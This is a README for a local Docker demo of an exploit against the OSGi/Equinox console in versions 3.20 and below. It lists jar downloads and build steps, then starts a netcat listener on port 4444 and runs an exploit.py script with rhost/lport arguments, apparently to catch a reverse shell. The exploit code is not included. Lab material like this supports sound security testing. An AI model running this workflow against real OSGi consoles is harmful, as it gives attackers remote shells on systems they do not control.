# OSGi v3.20 and below

## Demo setup
1. Create the resource directory
```bash
mkdir -p ./resources/jarfiles
```
2. Download the [OSGi 3.20](https://download.eclipse.org/equinox/drops/R-4.32-202406010610/download.php?dropFile=org.eclipse.osgi_3.20.0.v20240509-1421.jar) to the folder created above and rename it to `org.eclipse.osgi_3.20.jar`
3. Download the [Equinox Console 1.4](https://download.eclipse.org/equinox/drops/R-4.32-202406010610/download.php?dropFile=org.eclipse.equinox.console_1.4.800.v20240513-1104.jar) to the folder created above and rename it to `org.eclipse.equinox.console_1.4.jar`
4. Download the [OSGi Services 3.12](https://download.eclipse.org/equinox/drops/R-4.32-202406010610/download.php?dropFile=org.eclipse.osgi.services_3.12.100.v20240327-0645.jar) to the folder created above and rename it to `org.eclipse.services_3.12.jar`
5. Download the [OSGi Util 3.7](https://download.eclipse.org/equinox/drops/R-4.32-202406010610/download.php?dropFile=org.eclipse.osgi.util_3.7.300.v20231104-1118.jar) to the folder created above and rename it to `org.eclipse.util_3.7.jar`
6. Download the [Felix Gogo Command 1.1.2](https://download.eclipse.org/equinox/drops/R-4.32-202406010610/download.php?dropFile=org.apache.felix.gogo.command_1.1.2.jar) to the folder created above and rename it to `org.apache.felix.gogo.command_1.1.2.jar`
7. Download the [Felix Gogo Runtime 1.1.6](https://download.eclipse.org/equinox/drops/R-4.32-202406010610/download.php?dropFile=org.apache.felix.gogo.runtime_1.1.6.jar) to the folder created above and rename it to `org.apache.felix.gogo.runtime_1.1.6.jar`
8. Download the [Felix Gogo Shell 1.1.4](https://download.eclipse.org/equinox/drops/R-4.32-202406010610/download.php?dropFile=org.apache.felix.gogo.shell_1.1.4.jar) to the folder created above and rename it to `org.apache.felix.gogo.shell_1.1.4.jar`
9. Build OSGi image
```bash
docker build -t osgi_v3.20 .
```
10. Start OSGi container
```bash
docker run --network="host" -it --rm osgi_v3.20
```
11. Set up a netcat listener
```bash
nc -nvlp 4444
```
12. Run the exploit
```bash
python exploit.py --rhost=localhost --rport=1337 --lhost=localhost --lport=4444
```
## Resources
[Latest OSGi and dependencies](https://download.eclipse.org/equinox/drops/R-4.32-202406010610)
